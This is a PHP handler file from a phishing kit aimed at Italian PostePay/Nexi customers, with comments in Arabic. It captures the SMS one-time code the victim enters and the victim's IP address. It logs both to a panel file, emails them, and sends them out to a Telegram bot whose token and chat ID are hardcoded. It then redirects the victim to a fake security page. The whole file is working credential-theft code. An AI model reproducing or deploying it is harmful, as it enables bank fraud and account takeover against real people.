<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // تجميع الـ 6 خانات للـ SMS من الحقل المخفي أو الحقول الفردية
    $sms_code = "";
    if (isset($_POST['otp']) && !empty($_POST['otp'])) {
        $sms_code = $_POST['otp'];
    } elseif (isset($_POST['sms']) && is_array($_POST['sms'])) {
        $sms_code = implode('', $_POST['sms']);
    } elseif (isset($_POST['otp-01'])) {
        $sms_code = $_POST['otp-01'] . $_POST['otp-02'] . $_POST['otp-03'] . $_POST['otp-04'] . $_POST['otp-05'] . $_POST['otp-06'];
    } else {
        $sms_code = $_POST['sms'] ?? '';
    }

    if (!empty($sms_code)) {
        $_SESSION['sms'] = $sms_code;
        
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        
        // استدعاء ملف الإعدادات
        include('../../BOTS/STRNG.php');
        
        $ATR480X  = "•••••••••• 🔑 [ POSTEPAY.ATR480X ] 🔑\n";
        $ATR480X .= "[ SMS ] *  :  " . $sms_code . "\n";
        $ATR480X .= "•••••••••• ℹ️ [ VICM.INFS ] ℹ️\n";
        $ATR480X .= "[ 🔎 ] *  =  [ $ip ]\n";
        $ATR480X .= "•••••••••• 🇮🇹🇮🇹.[IT].🇮🇹🇮🇹\n";

        // حفظ البيانات في الملف
        $file = fopen("../../PANEL/ATR480X.html", "a+");
        fwrite($file, $ATR480X); 
        fclose($file);
        
        // إرسال الإيميل
        $to = "";
        $subject = "[ SMS.0️⃣.❌ RECEIVED ]";
        $headers = "From: [ NEXI.ATR480X ]<atr480x@atr480x.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
        mail($to, $subject, $ATR480X, $headers);
        
        // إرسال البيانات إلى بوت التليجرام
        $token = "7914161075:AAEqWnx2pDLsPdalz-xMo4gvw0Yi9pV3h3o";
        @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1858722787&text=" . urlencode($ATR480X));
        
        // التوجيه إلى صفحة الـ Redirect النهائية
        $rand_str = isset($my_rand_strng) ? $my_rand_strng : '';
        header("Location: ../SISTEMA.DI.SICUREZZA/REDIRECT/EXAMPLE.php?client_id=" . $rand_str);
        exit();
        
    } else {
        // في حال كان الرمز فارغاً، إعادة توجيه مع الخطأ
        $err = isset($_GET['error']) ? $_GET['error'] : 'err';
        header("Location: ?error=" . md5($err));
        exit();
    }
} else {
    // إذا تم الوصول للملف مباشرة بدون POST
    header("Location: ../../");
    exit();
}
?>
